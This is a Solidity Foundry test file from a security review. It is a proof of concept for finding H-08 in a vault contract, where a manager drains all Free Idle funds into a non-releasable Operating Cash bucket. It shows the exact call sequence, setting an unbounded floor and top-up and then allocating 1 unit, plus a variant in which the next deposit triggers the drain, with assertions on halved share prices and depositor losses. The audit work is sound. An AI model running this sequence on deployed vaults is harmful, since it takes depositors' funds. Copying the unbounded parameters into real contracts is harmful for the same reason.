// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {console2} from "forge-std/console2.sol";
import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {CoreVaultFixture} from "../../unit/core/CoreVaultFixture.sol";

/// @notice Review port of core-a H01, consolidated finding H-08 (register S-5, Open, founder decision). Hub Operating
///         Cash is outside Share Assets and outside `sweepExcess`, and `setOperatingCashParameters` takes any floor and
///         any top-up. Still true on main: the manager moves all Free Idle into it with one parameter change and one
///         allocation of 1 base unit, or lets the next third-party deposit do it. The sweep's interim release verb was removed
///         on 2026-10-01 (it let a manager and an ally extract the fund, S-63), so the sink is one-way again until the
///         founder rules on a cap (SEC-OQ-2).
contract H01_OperatingCashSink is CoreVaultFixture {
    address internal stranger = makeAddr("stranger");

    function test_POC_REVIEW_H08_managerMovesAllFreeIdleIntoOperatingCash() public {
        _deposit(alice, 500_000e6);
        _deposit(bob, 500_000e6);
        // Bob asks a Standard Payout of his whole position; his reserve is fully funded (DEC-072).
        _request(bob, 498_750e6, ICoreVault.PayoutMode.Standard);
        uint256 fairPrice = vault.sharePrice();
        assertEq(vault.payoutReserve(), 498_750e6);

        // Manager: floor = max, top-up = Free Idle - 1, then any top-up-running verb.
        uint256 free = vault.freeIdle();
        assertEq(free, 498_750e6);
        vm.startPrank(manager);
        vault.setOperatingCashParameters(type(uint256).max, free - 1);
        vault.allocateToHubSpokeVault(1);
        vm.stopPrank();

        console2.log("operating cash (USDC 6d)", vault.operatingCash());
        console2.log("share price fair / after", fairPrice, vault.sharePrice());
        assertEq(vault.operatingCash(), 498_749_999_999, "all of Free Idle moved to Operating Cash");
        assertEq(vault.freeIdle(), 0);
        assertEq(fairPrice, 1e24, "1.00 USDC per share before");
        assertEq(vault.sharePrice(), 500_000_000_001_002_506_265_664, "0.50 USDC per share after");

        // No verb returns Operating Cash any more (S-63): the sink is one-way.
        vm.prank(manager);
        (bool released,) = address(vault).call(abi.encodeWithSignature("releaseOperatingCash(uint256)", 1));
        assertFalse(released, "no release verb");

        // Bob's reserved Standard Payout is paid at the collapsed price.
        vm.warp(block.timestamp + 72 hours + 1);
        ICoreVault.PayoutReceipt memory r = _claim(bob);
        console2.log("bob paid (USDC 6d)", r.usdcPaid);
        assertEq(r.usdcPaid, 248_751_562_500, "Bob receives about half of what his shares were worth");
        assertEq(shares.balanceOf(bob), 0, "and all his shares are burned");

        assertEq(vault.sweepExcess(address(usdc)), 0, "not sweepable");
        assertEq(vault.operatingCash(), 498_749_999_999, "498,750 USDC outside Share Assets");
    }

    /// @dev The drain also runs from a third party's verb once the parameters are set: the next deposit tops up first
    ///      (the entrant is priced after it), so every existing holder is diluted by the whole Free Idle.
    function test_POC_REVIEW_H08_nextDepositRunsTheDrainForTheManager() public {
        _deposit(alice, 1_000_000e6);
        // Some value outside Idle so the mint can still be priced after the drain (hub position of 100,000 USDC).
        vm.prank(manager);
        vault.allocateToHubSpokeVault(100_000e6);
        hubVault.moveToPosition(100_000e6);
        uint256 aliceValueBefore = shares.balanceOf(alice) * vault.sharePrice() / 1e36;

        vm.prank(manager);
        vault.setOperatingCashParameters(type(uint256).max, type(uint256).max);
        _deposit(bob, 1000e6);

        uint256 aliceValueAfter = shares.balanceOf(alice) * vault.sharePrice() / 1e36;
        console2.log("alice value before / after (USDC 6d)", aliceValueBefore, aliceValueAfter);
        console2.log("operating cash", vault.operatingCash());
        assertEq(aliceValueBefore, 997_500e6);
        assertEq(aliceValueAfter, 99_999_999_999, "alice lost 90% of her value to Operating Cash");
        assertEq(vault.operatingCash(), 897_500e6);
    }
}
